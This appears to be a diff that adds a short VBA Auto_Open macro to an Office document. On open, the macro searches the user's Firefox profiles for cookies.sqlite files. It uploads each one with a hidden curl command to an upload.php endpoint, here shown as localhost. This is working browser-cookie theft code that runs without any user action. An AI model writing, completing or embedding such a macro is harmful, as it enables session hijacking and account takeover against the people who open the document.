@@ -1,0 +1,14 @@
+Sub Auto_Open()
+Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
+FF = Environ("AppData") & "\Mozilla\Firefox\Profiles\"
+PROF = Dir(FF, vbDirectory)
+Do While PROF <> ""
+      If (GetAttr(FF & PROF) And vbDirectory) = vbDirectory Then
+        COK = FF & PROF & "\cookies.sqlite"
+        If PROF <> "." And PROF <> ".." And fso.FileExists(COK) Then
+        EX = Shell("cmd.exe /c curl -F f=@" & COK & " http://localhost/upload.php", 0)
+        End If
+      End If
+   PROF = Dir()
+Loop
+End Sub
